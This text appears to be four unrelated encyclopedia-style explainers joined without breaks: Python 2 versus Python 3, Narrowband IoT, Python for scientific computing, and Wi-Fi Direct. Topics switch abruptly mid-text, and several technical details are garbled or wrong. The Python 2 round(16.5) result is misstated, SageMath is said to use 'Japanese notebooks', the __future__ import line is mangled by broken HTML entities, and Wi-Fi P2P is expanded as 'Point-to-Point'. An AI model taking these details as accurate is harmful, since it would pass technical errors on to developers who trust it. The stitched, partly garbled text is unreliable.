To support string literals involving non - ASCII characters , making Unicode as default is a good thing .
When functions are treated as objects in Python and can make arguments , ` print ` is an unnecessary exception .
It 's a statement in Python 2 , but making it a function would make it more flexible .
A division that should result in a ` float ` instead does truncation and results in an ` int ` .
Python 2 needed extra functions / methods to minimize RAM usage , but Python 3 does lazy evaluation by default .
Although Python is strongly typed , Python 2 permits strange comparisons : ` None < 3 < " 2 " ` .
Nick Coghlan provides a detailed discussion of why Python 3 was defined in a backwards incompatible manner .
I am new to Python .
Should I learn Python 2 or Python 3 ?
Python 3 fixes many of the problems that are present in Python 2 .
Python 3 is also the future of the language since Python 2 will be retired in 2020 .
It 's therefore recommended that beginners learn Python 3 .
Moreover , if you 're going to write new code , Python 3 is the one to choose .
Eevee 's blog article gives a detailed explanation of all the good things in Python 3 .
If you want to maintain the legacy of Python 2 code , it 's still best to learn Python the right way from Python 3 .
Then you can study the differences between Python 2 and 3 .
The point is that the two versions are much more similar than different .
What features of Python 3 have been backported to Python 2.7 ?
Backporting has been done mainly to aid in the eventual migration of Python 2 code to Python 3 .
A list of backports is documented in the official Python Docs and explained briefly in Eevee 's blog .
As an example , ` bytes ` and ` bytearray ` are part of Python 3.x but they were backported to 2.6 but with very different semantics .
In Python 2 , ` bytes ` is really an alias for ` str ` .
The purpose was really to aid converters such as ` 2to3 ` .
What are the differences between Python 2 and Python 3 for data types ?
Handling of strings and bytes .
Source : Adapted from Hornick and Yoder , 2018 , slide 3 .
The following is a summary of the key differences : < tr > < th > Python 2.X</th > < th > Python 3.X</th > < /tr > < tr > < td > There 's ASCII ` str ` type and ` unicode ` type , but no separate type to handle bytes of data</td > < td > All strings ( ` str ` ) are Unicode strings ; two byte classes are introduced : ` bytes ` and ` bytearray`</td > < /tr > < tr > < td > Two types of integers : C - based integers ( ` int ` ) and Python long integer ( ` long`)</td > < td > All integers are long but referred to by the ` int ` type</td > < /tr > < tr > < td > Return type of division is int if operands are integers : ` 5 / 4 ` gives ` 1 ` ; ` 4 / 2 ` gives ` 2`</td > < td > Return type of division is ` float ` even if operands or result are integers : ` 5 / 4 ` gives ` 1.25 ` ; ` 4 / 2 ` gives ` 2.0`</td > < /tr > < tr > < td>`round(16.5 ) ` returns a ` float ` of value 16.0</td > < td>`round(16.5 ) ` returns an ` int ` of value 16</td > < /tr > < tr > < td > Unorderable types can be compared</td > < td > Comparison of unorderable types raises a TypeError</td > < /tr > What are the other differences between Python 2 and Python 3 ?
How user input differs between Python 2 and 3 .
Source : Klein , 2018 .
The following is a summary of key differences : < tr > < th > Python 2.X</th > < th > Python 3.X</th > < /tr > < tr > < td>`print ` is a statement : ` print " Hello World!"`</td > < td>`print ( ) ` is a built - in function : ` print("Hello World!")`</td > < /tr > < tr > < td>`range ( ) ` returns a list of numbers while ` xrange ( ) ` returns an object for lazy evaluation</td > < td>`range ( ) ` returns an object for lazy evaluation similar to Python 2 ` xrange ( ) ` ; and ` range ( ) ` method ` & lowbar;&lowbar;contains&lowbar;&lowbar ; ` speeds up lookups < /td > < /tr > < tr > < td > Functions / methods ` map ( ) ` , ` filter ( ) ` , ` zip ( ) ` , ` dict.items ( ) ` , ` dict.keys ( ) ` , ` dict.values ( ) ` return lists</td > < td > These function / methods return objects for lazy evaluation</td > < /tr > < tr > < td>`raw_input ( ) ` returns input as ` str ` and ` input ( ) ` evaluates the input as a Python expression</td > < td>`input ( ) ` will return a string similar to Python 2 ` raw_input()`</td > < /tr > < tr > < td > Raising exceptions : ` raise IOError("file error " ) ` or ` raise IOError , " file error"`</td > < td > Raising exceptions : ` raise IOError("file error")`</td > < /tr > < tr > < td > Handling exceptions : ` except NameError , err : ` or ` except ( TypeError , NameError ) , err:`</td > < td > Handling exceptions : ` except NameError as err ` or ` except ( TypeError , NameError ) as err ` < /td > < /tr > < tr > < td > On generators , a method or function call : ` g.next ( ) ` or ` next(g)`</td > < td > On generators , only a function call : ` next(g)`</td > < /tr > < tr > < td > Loop variables in a comprehension leak to global namespace</td > < td > Loop variables are limited in scope to the comprehension</td > < /tr > What does the Python standard library provide to manage the incompatibility between Python 2 and 3 ?
The following are some modules that we can use : ` builtins ` : To create wrappers around built - in functions , ` builtins ` are useful .
` future_builtins ` : Function ` map ` and ` filter ` in Python 2 behave differently than in Python 3 .
To get the Python 3 behaviour , use ` from future_builtins import map , filter ` .
` & lowbar;&lowbar;future&lowbar;&lowbar ; ` : In Python 2 , to use ` print ( ) ` only as a function , use ` from lowbar;&lowbar;future&lowbar;&lowbar ; import print_function ` .
` 2to3 ` : To convert Python 2 code to Python 3 , this standard library can be used .
It applies a series of fixers to do the conversion .
It 's based on the ` lib2to3 ` library , which can be used to add custom fixers .
Python Converter is an online conversion tool based on ` 2to3 ` .
I have a legacy Python 2 codebase but would like to start supporting Python 3 as well .
What can I do ?
There are a few approaches that developers can take depending on the need : ` modernize ` : This is useful when you want to partially support both 2 and 3 with the goal of eventually porting to Python 3 .
` future ` : This enables either Python 2 or 3 code to be used across both versions .
It comes with scripts ` futurize ` and ` pasteurize ` for 2-to-3 and 3-to-2 conversions respectively , so that a single codebase can be used .
It 's supported for versions 2.6 + and 3.3 + .
There is a cheatsheet that gives examples of writing compatible code .
` six ` : This wraps over the differences between 2 and 3 without modifying the code .
This means the code can run on both versions .
It 's recommended to drop support for Python 2.6 and older if possible .
If a legacy code must be maintained , one can opt for commercial services such as from ActiveState .
Tools such as Pylint , Caniusepython3 and Tox can help in checking or maintaining compatibility .
Developers can also refer to a cheatsheet for writing compatible code ; or get familiar with common migration problems .
Python 2.6 is released .
The development of this release is synchronized with that of Python 3.0 .
Thus , Python 2.6 incorporates some changes that are part of Python 3.0 .
This backporting is expected to make way for easier migration of Python 2.6 + code to Python 3.x .
Module ` future_builtins ` has 3.0 semantics .
Python 3.0 has been released .
It simplifies some of the unwieldy syntax that was in Python 2.x .
It 's not backward compatible with Python 2.x and hence its release is seen as controversial .
However , Python 3.x is the future of the language .
Python 3.0 itself is deemed a failure due to slow IO .
Python 3.1 is released and it supercedes Python 3.0 that was unusable .
Python 2.7 is released .
It includes some features introduced in Python 3.1 .
Python 2.7.x releases will receive bug fixes as well as backports from Python 3.x to make it easier in the future to migrate that code to Python 3 .
It 's the last 2.x release ( there wo n't be a 2.8 release ) .
It 's expected to be retired in April 2020 , implying that it will be maintained for 10 years since its initial release .
Python 3.2 is released .
A year later , it 's seen that with this release , Python 3 gains traction .
Python 3.3 reinstates the redundant syntax for Unicode string : ` u'hello ' ` .
This is done to enable easier migration from 2 to 3 .
Python 2.6 reaches the end of life and at least one expert recommends ( in 2016 ) that developers should move to 2.7 if moving to 3.x is not an option .
Jake VanderPlas states that the scientific community should adopt Python 3 thanks to tools such as ` six ` and ` future ` .
In 2013 , VanderPlas had noted that moving to Python 3 was impossible ( back then ) .
In November , popular Python author Zed Shaw published a scathing article about Python 3 .
A day later , a blogger named Eevee publishes a detailed rebuttal .
In 2017 , Python 3 adoption is at 75 % overall .
Source : JetBrains 2017 .
A Python Developers Survey towards the end of 2017 done by JetBrains finds that 75 % of respondents use Python 3 .
In the domain of data science , adoption is higher at 80 % .
The last major version of Python 2.7 is expected to be released in April .
Following this , Python 3 will be the only one supported for bugs and security fixes .
The advantages of using NB - IoT. Source : Glassman , 2016 .
Narrowband IoT ( NB - IoT ) is a cellular low - power wide - area ( LPWA ) connectivity standard that enables IoT devices to send their data directly to the cloud without a gateway in between .
By low power , we mean that IoT devices can run on a battery for 10 + years .
By wide area , we mean that cell coverage is improved so that , for example , smart meters in basements can connect to the network reliably .
Traditional cellular standards focused on either voice or bandwidth - intensive low - latency data applications .
These are not scalable for IoT due to cost , coverage , device density and power .
NB - IoT reduces complexity , limits bandwidth , and caps maximum data rates .
This is possible because IoT sensor devices are tolerant of delays , require minimum mobility and operate at low data rates .
What are some useful cases of NB - IoT ?
Applications and use cases of NB - IoT. Source : u - blox , 2018a .
In general , applications that send small amounts of data occasionally from sensor nodes that run on batteries , of limited mobility and installed in remote locations will benefit by using NB - IoT. NB - IoT fills the gap between cellular technologies such as 3G/4 G and short range technologies such as Wi - Fi / ZigBee / Bluetooth .
In other words , it solves the last - mile problem for IoT devices .
Applications that require high device density ( 50,000 devices per cell ) can use NB - IoT. Smart metering , asset tracking , wearables including health monitoring , facility management , intruder and fire alarms , smart dustbins , smart street lighting , connected appliances at home or factories ... these are some use cases of NB - IoT. GSMA has published detailed case studies on smart metering , smart parking , wildlife tracking and environmental monitoring .
Likewise , successful implementations of smart metering , smart parking and smart agriculture have been reported .
What are the techniques enabling NB - IoT ?
Since sensor nodes require low data rates , bandwidth is reduced to 180 kHz .
Many of the supported bands are in sub - GHz , so that better range is obtained .
Range is also increased by repeating transmissions .
Further reduction in device cost and complexity is due to supporting only FDD , single antenna ( no MIMO ) and half - duplex mode .
Multitone uplink is optional .
Single - tone uplink uses the power amplifier more efficiently .
More devices can be supported within the same cell .
For lowering power requirements , Release 12 introduced both Power Saving Mode ( PSM ) and Discontinuous Reception ( DRX ) .
With PSM , the device is registered with the network but can go into deep sleep for up to 12.1 days .
The device can wakeup to send data or do a Tracking Area Update .
With DRX , device need not monitor control channels most of the time .
Release 13 improves this with extended DRX ( eDRX ) in which the device can go to sleep for up to 3 hours .
For unscheduled mobile terminated data , DRX is better .
DRX also avoids unnecessary signalling , whereas PSM would still require a TAU even when the device has no data to send .
What are the key parameters of NB - IoT ?
NB - IoT key parameters .
Source : Wu , 2017 , pg .
27 .
In Release 13 , NB - IoT is supported in many bands , many of which are sub - GHz .
NB - IoT uses only one physical resource block ( PRB ) at 180 kHz .
Coverage is better than GPRS by 20dB. Support is only for FDD , half - duplex without any MIMO .
Since sensor devices will mostly be sending data and occasionally receiving commands , the uplink data rate is higher than downlink .
Uplink can be single - tone or multitone .
What are the modes in which NB - IoT can be deployed ?
The three modes of NB - IoT deployment .
Source : ShareTechnote , 2018 .
NB - IoT has three modes : In - band Mode : This is the easiest for operators since no changes to hardware are needed .
LTE spectrum is used .
Many operators in Europe have adopted this .
Internal interference ( inter - PRB ) can be a problem and this has to be managed effectively .
Guardband Mode : NB - IoT is served by the same eNodeB that serves the LTE cell , thus sharing the power .
There 's no spectrum cost since the operation is in the guard band .
Interference is better managed than in in - band mode .
Standalone Mode : By refarming unused GSM bands , NB - IoT can be deployed in these bands .
Frequency planning incurs a cost .
New RF modules are needed , but more power may be available since this is independent of the LTE cell .
Who are the chipset vendors for NB - IoT ?
Among the major vendors are ARM , Altair Semiconductor ( acquired by Sony ) , Huawei , Intel , Qualcomm , Sequans Communications and Nordic Semiconductor .
ARM is a relatively new entrant to this space .
Its Cordio - N IP includes Cortex - M33 that can run both the stack and application .
The industry 's design approach seems to be a dual - mode chip for both Cat - M1 and Cat - NB1 .
This is seen in Altair 's ALT1250 , Intel 's XMM 7315 , Qualcomm 's MDM9206 , Sequans ' Monarch and Monarch SX , and Nordic 's nRF91 .
.
One reason for this dual - mode approach is the uncertainty of NB - IoT 's adoption due to the presence of LTE - M. MediaTek has integrated NB - IoT and GSM / GPRS into a single SoC MT2621 for IoT deployment in a GSM / GPRS network that can later be migrated to NB - IoT. The SARA - R4 / N4 series from u - blox also dual - mode .
At module level , Sierra Wireless supplies modules that use Altair 's ALT1250 .
Murata will supply modules that integrate ALT1250 and MCUs from STMicroelectronics .
Nick Hunn has given a thorough discussion of the NB - IoT chipset landscape as of March 2018 .
What are some considerations when designing for NB - IoT ?
Block diagram of Sequans ' Monarch SX .
Source : Yoshida , 2017 .
High levels of SoC integration are seen , for example , in Monarch SX that includes an ARM Cortex - M4 , an ARM - based sensor hub , a graphics controller , and a media processing engine .
Indeed , it 's been said that while firms initially focused on making thin modems , the current battle is about SoC integration .
Unlike the Monarch SX , Altair 's ALT1250 does n't have an MCU but includes GPS .
It 's been said of NB - IoT SoC that design efforts need to be directed at optimizing power and cost rather than optimizing performance .
The Cache memory sub - system involves a tradeoff between performance and area .
The use of hardware accelerators is not preferred at NB - IoT 's low data rates .
With regard to the protocol stack , an optimized memory footprint can avoid the use of external flash and hence save on both cost and power consumption .
Optimal RAM usage will most likely be achieved by designing from scratch rather than downscaling from legacy LTE design .
Single - core solutions that integrate service layer , application and layer 1 are now possible , due to half - duplex operation and relaxed delay constraints .
Applications must manage sleep and wakeup - cycles for power optimization .
Could you compare NB - IoT against other LPWA technologies ?
LPWA technologies competing with NB - IoT include the following : LoRa : By early 2018 , LoRa had 60 + public networks and 350 + ongoing trials in 100 + countries .
LoRaWAN is a networking stack that uses LoRa .
Symphony Link and Haystack are alternatives that use LoRa .
SigFox : Started in France , by September 2017 , SigFox was deployed in 36 countries with national coverage in 17 of them .
RPMA : US company Ingenu has used Random Phase Multiple Access technology to provide its Machine Network in some areas of the US .
The technology is now available for deployment outside the US .
Weightless : Weightless SIG has standardized three variants : Weightless - N , -P and -W. Weightless - P also uses licensed spectrum .
NB - IoT has the advantage that it builds on existing cellular networks and enables global roaming .
It also uses licensed spectrum implying that interference is better managed .
As of February 2018 , NB - IoT had 41 launches by 23 operators in 26 countries .
Could you compare NB - IoT against other cellular IoT standards ?
Comparing NB - IoT with other cellular IoT and LPWA technologies .
Source : Debbah , 2016 , slide 24 .
There are two alternatives that 3GPP provides : LTE - M : LTE - M is also known by the name enhanced Machine Type Communications ( eMTC ) or LTE - MTC .
The UE category that supports NB - IoT is named Cat - NB1 ; the same for LTE - M is called Cat - M1 .
EC - GSM - IoT : Extended Coverage GSM - IoT optimizes GSM networks for IoT. Upgrade costs are expected to be minimal , but there 's also doubt if the market will require this technology .
LTE - M operates in the LTE spectrum while NB - IoT can be deployment in three different modes .
While LTE - M is a simplification of LTE , NB - IoT is really a DSSS modulation .
For operators , LTE - M is only a software upgrade from LTE , but NB - IoT will require an infrastructure upgrade .
While NB - IoT is suited for low data rate applications , LTE - M targets content - rich applications as well .
LTE - M is suited for higher data rates and mobility than NB - IoT can provide .
For example , LTE - M is suited for wearables while NB - IoT is suited for smart metering .
Note that the 200 + kbps peak data rates in NB - IoT are at Layer 1 and peak throughputs are much lower .
Are there any concerns about NB - IoT ?
LoRa and SigFox have been deployed in many countries .
For example , the Netherlands and South Korea both deployed nationwide LoRa networks in September 2016 .
The Dutch KPN commented that they chose LoRA " based on quality , technology readiness and industry adoption .
" NB - IoT is therefore a late entrant in the LPWAN space .
If it is to succeed , it has to drive down costs ; get the pricing right ; devices have to be interoperable .
There have been concerns about interoperability between Ericsson and Huawei devices .
NB - IoT Release 13 is available in 14 bands and Release 14 added another 4 bands .
This may lead to market fragmentation .
Support for all bands may result in higher cost and power consumption .
From the point of power availability at eNodeB , either eNodeB has to be upgraded or NB - IoT has to resort to retransmissions .
The former incurs cost while the latter drains the end - device battery .
On the business side , business models are far from clear .
Will people buy NB - IoT product and separately subscribe to a connection ?
Or will NB - IoT offer end - to - end services or solutions , including perhaps data analytics ?
Issues of data privacy and regulations also matter .
Is LTE - M competing against NB - IoT ?
LTE - M and NB - IoT are seen as complementary .
Source : Hao , 2017 , fig .
1 .
NB - IoT was created because LTE - M was seen as too ' broadbandish ' to compete against SigFox or LoRa .
However , differences between LTE - M and NB - IoT are no longer seen to be significant .
If LTE - M achieves high volumes and drives down costs , then this could be bad news for NB - IoT. LTE - M is a simple software upgrade to the RAN while NB - IoT is perceived to require new infrastructure and a new core network .
France 's Orange instead uses a combination of LTE - M and LoRa .
In March 2018 , AT&T reported that it 's deploying LTE - M but is keeping an eye on NB - IoT developments .
Others believe that both will coexist since their use cases are different .
As of June 2017 , operators worldwide are showing interest in both technologies .
From the standardization perspective , both technologies have a roadmap that includes single - cell multicast ( for over - the - air upgrades ) , enhanced device positioning ( for asset tracking ) and TDD support in NB - IoT. What support can developers expect in the NB - IoT space ?
The GSMA NB - IoT Forum is promoting NB - IoT and membership is open to non - GSMA members as well .
In April 2016 , Vodafone and Huawei set up the world 's first NB - IoT Open Lab as a testbed for manufacturers and app developers .
Since then , many others have been set up worldwide .
Since 2012 , Deutsche Telekom has been running an incubator named hub : raum to support early - stage startups .
As part of the WARP NB - IoT accelerator program , hub : raum selected 12 startups whose ideas will be piloted to customers around December 2017 .
A new study item titled " Cellular System Support for Ultra Low Complexity and Low Throughput Internet of Things " ( GP-140421 ) is proposed in 3GPP .
This kickstarts the work on NB - IoT. The document states that 3GPP M2 M devices use legacy GPRS but there are competing technologies that provide better coverage and efficiency at lower cost .
The document proposes looking into evolving GERAN plus designing a new access system .
3GPP Release 12 introduces the Cat-0 UE category .
This is targeted towards the IoT market .
Neul released the first pre - standard NB - IoT chip named Iceni .
The same year , u - blox used Iceni to produce the first NB - IoT module .
Huawei later acquired Neul .
3GPP completes the standardization of NB - IoT , which is part of Release 13 ( LTE - Advanced Pro ) .
Further changes to the specifications can be done only in a backward - compatible manner .
The world 's first commercial NB - IoT network goes live on Deutsche Telekom 's German and Dutch networks .
The first application is a smart parking system .
Deutsche Telekom launched a pre - standard NB - IoT on a commercial network back in October 2015 .
Comparing UE categories Cat - NB1 and Cat - NB2 .
Source : 5 G Americas , 2017 , table 4.3 .
Enhancements to NB - IoT are introduced as part of 3GPP Release 14 .
These include improved positioning capabilities , enhanced Multicast DL transmission , new band and power class support , mobility enhancements , support of higher data rates , and non - anchor PRB enhancements .
UE category Cat - NB2 is introduced .
Market status of NB - IoT and LTE - M deployments / devices .
Source : Adapted from GSMA 2020 , fig .
1 , 5 .
A GSMA report notes that 111 operators have deployed NB - IoT networks , of which 34 operators have also deployed LTE - M networks .
Whereas 32 countries have both NB - IoT and LTE - M networks , 28 countries have only NB - IoT networks .
Among NB - IoT compliant devices , 347 Cat - NB1 devices and 63 Cat - NB2 devices are now available on the market .
Some packages of Python 's scientific stack .
Source : VanderPlas 2017 , slide 52 .
Fortran has been the language of choice for many decades for scientific computing because of speed .
In the 1980s , when a programmer 's time was becoming more valuable than computer time , there was a need for languages that were easier to learn and use .
For the purpose of research , code - compile - execute workflow gave way to interact - explore - visualize workflow .
In this context , were born MATLAB , IDL , Mathematica and Maple .
Modern scientific computing is not just about numerical computing .
It needs to be versatile : deal with large datasets , offer richer data structures than just numerical arrays , make network calls , interface with databases , interwork with web apps , handle data in various formats , enable team collaboration , enable easy documentation .
Python offers all of the above .
It 's been said that Python provides a balance of clarity and flexibility without sacrificing performance .
What makes Python a suitable language for scientific computing ?
Python is not just suited to manipulating numbers .
It offers a " computational ecosystem " that can fulfil the needs of a modern scientist .
Python does well in system integration , in gluing together many different parts contributed by different folks .
Python 's duck typing is one of the reasons why this is possible .
In terms of data types , ` memoryview ` , ` PyCapsule ` and NumPy 's ` array ` aid scientific work .
Python is easy to learn and use .
It offers a natural syntax .
This enables researchers to express and explore their ideas more directly rather than fight with low - level language syntax .
With Python , performance bottlenecks can be optimized at a low - level without sacrificing high - level usability .
A researcher needs to explore and visualize ideas in an incremental manner .
Python allows for this via IPython / Jupyter notebooks and matplotlib .
A variety of Python tools can work together and share data within the same runtime environment without having to exchange data only via the filesystem .
I 'm used to MATLAB .
Why should I use Python ?
Comparing MATLAB with Python .
Source : Pyzo 2016 .
MATLAB is proprietary , expensive and hard to extend .
Python is open , community - driven , portable , powerful and extensible .
Python is also better with strings , namespaces , classes and GUIs .
While MATLAB , along with Simulink , has vast libraries , Python is catching up as many scientific projects are adopting Python .
MATLAB is said to be poor at scalability , complex data structures , memory handling , system tasks and database programming .
However , there are some criticisms of Python ( December 2013 ) .
Syntax is not consistent since different packages are written by different folks with different needs .
There are two ordinary differential equation ( ODE ) solvers in scipy with incompatible syntax .
Duplicated functionality across packages may result in confusion .
MATLAB does better with data regression , boundary value problems and partial differential equations ( PDE ) .
In 2014 , Konrad Hinsen commented that Python may not be suitable for small - scale projects where code is written once and rarely maintained thereafter .
This becomes a problem when Python scientific libraries are upgraded by deprecating older classes / functions / methods .
Should I worry about performance when using Python for scientific research ?
Comparing the performance of some languages for scientific computing .
Source : Adapted from Hirsch 2018 .
The short answer is no .
There are many initiatives that aim to make Python faster .
PyPy and Pyston do just - in - time ( JIT ) compilation for better performance .
Nuitka aims to replace the Python runtime by automatically transpile code to languages that run faster .
Numba speeds up math - heavy Python code to native machine instructions with just a few annotations on your Python code .
While pure Python code is definitely slower when compared to Fortran or C , scientific packages in Python often make use of low - level implementations that are themselves written in Fortran , C , etc .
For example , NumPy operations often call BLAS or LAPACK functions that are written in Fortran .
f2py enables Python to directly use Fortran implementations .
SWIG and Cython allow us to make calls to optimized C / C++ implementations from within Python .
For example , Cython is being used by scikit - learn .
Intel Math Kernel Library ( MKL ) and PyCUDA are also bringing Python to par with Fortran on specific hardware platforms .
What are the essential packages for scientific computing in Python ?
Here are some packages that could be considered essential : numpy : Multi - dimensional arrays and operations on them .
It executes faster than Python .
scipy : Linear algebra , interpolation , integration , FFT ... matplotlib : Plotting and data visualization with an API similar to MATLAB .
Eases transition from MATLAB to Python .
spyder : An IDE that includes IPython ( for interactive computing ) .
pandas : Numerical data structures , data manipulation and analysis .
jupyter : Web - based sharing of code , graphs , annotations and results .
Most Python scientific packages are based on numpy and scipy .
If visualization is involved , matplotlib may be used .
For higher - level data structures , pandas may be used .
Spyder , IPython and Jupyter are simply useful tools for the scientist or engineer .
Could you name some useful scientific projects / packages in Python ?
Here are some that can be applied to any domain : Image processing : Pillow , OpenCV , scikit - learn , Mahotas Visualization : matplotlib , bokeh , plotly , mayavi , seaborn , basemap , NetworkX Markov chains : Markov , MarkovNetwork , PyMarkov , pyEMMA , hmmus Stochastic process : stochastic , StochPy , sdeint Solving PDEs : FEniCS , SfePy Convex Optimization : CVXPY Units and conversions : quantities , pint Multi - precision math : mpmath , GmPy Spatial analysis : cartopy , georasters , PySAL , geopy Data access : pydap , cubes , Blaze , bottleneck , pytables Machine learning : scikit - learn , Mlpy , TensorFlow , Theano , Caffe , Keras Natural Language Processing : NLTK , TextBlob , spaCy , gensim , pycorenlp Statistics : statistics , statsmodels , patsy Tomography : TomoPy Symbolic computing : sympy Simulations : SimPy , BlockCanvas , railgun Could you name some domain - specific scientific projects / packages in Python ?
Since there are dozens of packages for all types of scientific work , we can only give a sample : Solar data analysis : SunPy Astronomy : astropy Chemistry : thermo , chemlab Biology : biopython Neurosciences : PsychoPy , NIPY Life sciences : DEAP Network analysis : NetworkX Quantum dynamics : QuTiP Protein analysis : ProDy Neuron simulations : NEURON Seismology : ObsPy Phylogenetic computing : DendroPy Software defined radio : GNU Radio What 's the recommended Python distribution for scientific computing ?
Installation of Python for scientific work used to be a pain earlier , but with modern distributions , this is no longer an issue .
Rather than install Python 's standard distribution and then install scientific packages one by one , the recommended approach is to use an alternative distribution customized for scientific computing : Enthought Canopy , Anaconda , Python(x , y ) or WinPython .
Enthought Canopy is commercial but the rest are free .
Enthought Canopy claims to include 450 + tested scientific and analytic packages .
Anaconda distribution uses condas for package management .
The use of virtual environments is recommended so that different projects can use their own specific environments .
Powered by Anaconda , Intel offers its own distribution that 's optimized for performance .
SageMath is another distribution that offers a web - based interface and uses Japanese notebooks .
It aims to be the free open - source alternative to Magma , Maple , Mathematica and Matlab .
As a beginner in scientific Python , what should be my learning path ?
From tools and environmental perspectives , get familiar with using IPython , Jupyter Notebook and , optionally , Spyder .
After learning the basics of Python , the next step is to learn Numpy since it 's the base for many scientific packages .
With numpy , you can work with matrices and do vectorized operations without having to write explicit loops .
You should learn about operations such as reshaping , transposing , filling , copying , concatenating , flattening , broadcasting , filtering and sorting .
You could then learn scipy to do optimization , linear algebra , integration , and so on .
For visualization , matplotlib can be a starting point .
For dealing with higher - level data structures and manipulation , learn pandas .
If you wish to get into data science , scikit - learn and Theano can be starting points .
For statistical modelling , you can learn statsmodels .
What useful developer resources are available for scientific computing in Python ?
One good place to start learning is the SciPy Lecture Notes .
The SciPy Conference is an annual event for Python 's scientific community .
It also happens in Europe as EuroSciPy and in India as SciPy India .
EarthPy is a collection of IPython notebooks for learning how to apply Python to Earth sciences .
The Hacker Within , Software Carpentry and Data Carpentry are some communities that bring together research and scientific folks .
Although these are not exclusive to Python , Python programmers will find them useful .
Numeric has been released to enable numerical computations .
This is the ancestor of today 's NumPy .
Many scientific modules are brought together and released as a single package named SciPy .
The same year , IPython was born .
The " Python for Scientific Computing Workshop " is organized at Caltech .
In 2004 , this was renamed as SciPy Conference and is now an annual event .
In 2008 , EuroSciPy was held for the first time .
In 2009 , the 1st SciPy India was held .
NumPy is released based on an older library named Numeric .
It also combines features of another library named Numarray .
NumPy was initially named SciPy Core but renamed NumPy in January 2006 .
Anaconda Accelerate is split into Intel Distribution for Python and open source Numba 's sub - projects pyculib , pyculib_sorting and data_profiler .
Wi - Fi Direct allows direct connections without an AP .
Source : Kaushal D 2016 .
Wi - Fi - Direct is a standard developed by Wi - Fi Alliance so that Wi - Fi devices can connect and communicate with each other directly without using an access point ( AP ) .
This is also known as Wi - Fi P2P ( Wi - Fi Point - to - Point ) .
This is very useful for direct file transfer , internet sharing , or connecting to a printer .
Wi - Fi Direct can communicate with one or more devices simultaneously at typical Wi - Fi speeds .
Wi - Fi Direct supports IEEE 802.11 a / b / g / n/ standards .
Can you explain how Wi - Fi Direct works ?
Discovery and WPS provisioning on Wi - Fi Direct .
Source : Bytes et al .
2020 , fig .
1 .
Wi - Fi Direct works in two steps : Device Discovery : A device first broadcasts a probe request message asking for MAC ID from all nearby devices .
This stage is similar to the scanning phase in regular Wi - Fi .
All devices that hear this message respond with a unicast message to the sender .
Devices alternate between sending them out and listening to probe requests , and subsequently their responses .
Service Discovery : Now the sender sends a unicast service request message to each device .
The receiving devices responds with a unicast message with service details .
In terms of the states or phases of Wi - Fi Direct , devices go through the scan phase ( scanning the channels ) , find phase ( which includes service discovery ) , formation phase ( a group is formed and includes WPS provisioning ) , and operational phase .
Whereas discovery happens on Social channels 1 , 6 and 11 in the 2.4GHz band , operation can be on either 2.4 or 5GHz bands .
How many devices can Wi - Fi Direct connect to ?
A Wi - Fi Direct - certified network can be one - to - one , or one - to - many .
The number of devices in a Wi - Fi Direct - certified group network is expected to be smaller than the number supported by traditional standalone access points intended for consumer use .
Connection to multiple other devices is an optional feature that will not be supported in all Wi - Fi Direct - certified devices ; some devices will only make 1:1 connections .
Can you explain the architecture of Wi - Fi Direct ?
Wi - Fi Direct can be used in 1:1 or 1 : n configurations .
Source : RF Wireless World 2018 .
As Wi - Fi Direct does not require any AP , the device itself has the capability to function like an AP .
Wi - Fi Direct devices , aka P2P Devices , communicate by establishing P2P Groups , which are functionally equivalent to traditional Wi - Fi infrastructure networks .
The device implementing AP - like functionality in the P2P Group is referred to as the P2P Group Owner ( P2P GO ) , and devices acting as clients are known as P2P Clients .
P2P GO is sometimes referred to as Soft AP .
Wi - Direct devices can function as 1:1 and 1 : n devices .
The shown topology in the diagram explains the scenario of 1:1 and 1 : n .
In the 1:1 scenario , a Wi - Fi Direct device is printing files at a printer .
In the 1 : n scenario , a laptop shares files with three other Wi - Fi devices .
Is it possible for Group Owner to connect to Wi - Fi AP ?
P2P Group Owners can also connect to AP while managing the group .
Source : Devopedia 2018 .
Only the P2P GO is allowed to cross - connect the devices in its P2P group to an external network .
Wi - Fi Direct does not allow transferring the role of P2P GO within the group .
If P2P GO leaves the P2P group , then the group is torn down , and has to be re - established .
Can you explain how group formation happens ?
Group formation procedure involves two phases : Determination of P2P Group Owner : Two P2P devices negotiate for the role of P2P Group Owner based on desire / capabilities .
A P2P GO role is established at formation or at an application level .
Provisioning of P2P Group : P2P group session is established using appropriate credentials .
Wi - Fi simple configuration is used to exchange credentials .
There are three ways of group formation : Standard , Autonomous and Persistent .
In Standard , P2P devices discover each other and negotiate who will act as P2P GO .
In Persistent , devices recall if they 've had a previous connection with a persistent flag set .
If so , GO Negotiation Phase ( 3-way handshake ) is replaced with the Invitation Phase ( 2-way handshake ) .
WPS Provisioning is simplified since stored network credentials are reused .
Can you explain how service discovery happens ?
The Service Discovery process enables Wi - Fi Direct devices to discover each other and the services they support before connecting .
For example , a Wi - Fi Direct device could see all compatible devices in the area and then narrow down the list to only devices that allow printing before displaying a list of nearby Wi - Fi Direct - enabled printers .
Before the establishment of a P2P Group , P2P devices could exchange queries to discover the set of available services and , based on this , decide whether to continue the group formation or not .
Generic Advertisement Service ( GAS ) as specified by 802.11u is used .
GAS is a layer 2 query and response protocol implemented through the use of public action frames , that allows two non - associated 802.11 devices to exchange queries belonging to a higher layer protocol ( e.g. a service discovery protocol ) .
How is security implemented in Wi - Fi Direct ?
Wi - Fi Direct devices are required to implement Wi - Fi Protected Setup ( WPS ) to support a secure connection with minimal user intervention .
WPS is based on WPA-2 security and uses AES - CCMP as ciphering , and a randomly generated Pre - Shared Key ( PSK ) for mutual authentication .
Could you explain Wi - Fi Direct 's Power Saving Mode ?
Wi - Fi Direct defines two new power saving mechanisms : Opportunistic Power Save Protocol : The Opportunistic Power Save protocol ( OPS ) allows a P2P Group Owner to opportunistically save power when all its associated clients are sleeping .
This protocol has a low implementation complexity but , given the fact that the P2P Group Owner can only save power when all its clients are sleeping , the power savings that can be achieved by the P2P Group Owner are limited .
Notice of Absence Protocol : The Notice of Absence ( NoA ) protocol allows a P2P GO to announce time intervals , referred to as absence periods , where P2P clients are not allowed to access the channel , regardless of whether they are in power save or inactive mode .
In this way , a P2P GO can autonomously decide to power down its radio to save energy .
What 's the speed of Wi - Fi Direct ?
A Wi - Fi Direct - certified device supports typical Wi - Fi speeds , which can be as high as 250 Mbps .
Even at lower speeds , Wi - Fi provides plenty of throughput for transferring multimedia content with ease .
The performance of a particular group of Wi - Fi Direct devices depends on whether the devices are 802.11 a , b , g , or n , as well as the particular characteristics of the devices and the physical environment .
Can you relate Wi - Fi Direct to Miracast ?
Miracast is a Wi - Fi display certification program announced by Wi - Fi Alliance for seamlessly transferring video between devices .
